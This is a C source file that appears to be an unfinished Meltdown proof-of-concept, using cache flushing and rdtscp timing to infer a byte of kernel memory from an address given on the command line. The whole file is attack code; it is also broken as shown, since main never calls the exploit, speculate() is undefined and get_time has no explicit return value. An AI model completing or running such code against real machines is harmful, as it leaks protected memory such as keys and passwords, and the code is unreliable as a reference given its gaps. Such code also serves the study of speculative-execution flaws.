#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <immintrin.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#define PAGE_SIZE 4096
#define ARR_SIZE 256

uint8_t* L1;	// load L1 cache

void speculate(char* target, char* detector);
void do_kernel_thing(void);
uint8_t leak_cache(char* target);
void dump_range(char* base);	
void meltdown(char* addr);
uint64_t get_time(char *addr);


void main(int argc, char* argv[]) {

	uint8_t* addr;	
	if (argc < 3) {
		printf("./md [address] [size]\n");
		exit(1);
	}	
	
	if (!sscanf(argv[1], "%p", &addr)) {
		printf("wrong address\n");
		exit(2);
	}
}


void meltdown(char * addr){

	L1 = malloc(PAGE_SIZE * (ARR_SIZE + 2));
	L1 = (char *)((uint64_t)L1 + 0x1000 >> 12 << 12);	
	memset(L1, 0, PAGE_SIZE * ARR_SIZE);

	printf("leak addr : %p\n", addr);
	
	unsigned char i = leak_cache(addr);
	printf("%02x\n", (unsigned char)i);

//	dump_range(addr);
}

uint64_t get_time(char *addr){

	__asm__ __volatile__(
			"rdtscp\n"
			"shl $32, %rdx\n"
			"or %rdx, %rax\n"
			"mov %rax, %rsi\n"
			"mov (%rdi), %al\n"
			"rdtscp\n"
			"shl $32, %rdx\n"
			"or %rdx, %rax\n"
			"sub %rsi, %rax\n"
	);
}


void do_kernel_thing(void) {
	syscall(0, 0, 0, 0);
}

uint8_t leak_cache(char* target) {
	
	for (uint32_t i = 0; i < ARR_SIZE; i++){
		_mm_clflush(L1 + i*PAGE_SIZE);
	}
	// Flush L1 Cache

	do_kernel_thing();
	speculate(target, L1);

	uint64_t timings[ARR_SIZE];
	
	for(uint32_t i=0; i < ARR_SIZE; i++){
		timings[i] = get_time(L1 + i * PAGE_SIZE);
	}
	
	for(uint32_t i=0; i < ARR_SIZE; i++){
		printf("timings[%02x] = %ld\n", (unsigned char)i, timings[i]);
	}
	uint32_t res = 0;
	for(uint32_t i=0; i < ARR_SIZE; i++){
		if(timings[res] > timings[i])
			res = i;
	}
	return (uint8_t)res;
}
/*
void dump_range(char* base) {
	for (uint32_t offs = 0; offs < 64; ++offs) {
		char* target = base + offs;

	    if ((((uintptr_t)target) & 15) == 0) {
			printf("%p: ", target);
		}
		int i = read_via_speculate(target);
		if (i < 0) {
			i = read_via_speculate(target);
		}
		if (i < 0) {
			printf("00 ");
		} else {
			printf("%02x ", i);
		}
    
		if ((((uintptr_t)target) & 15) == 15) {
			printf("\n");
		}
	}
}
*/
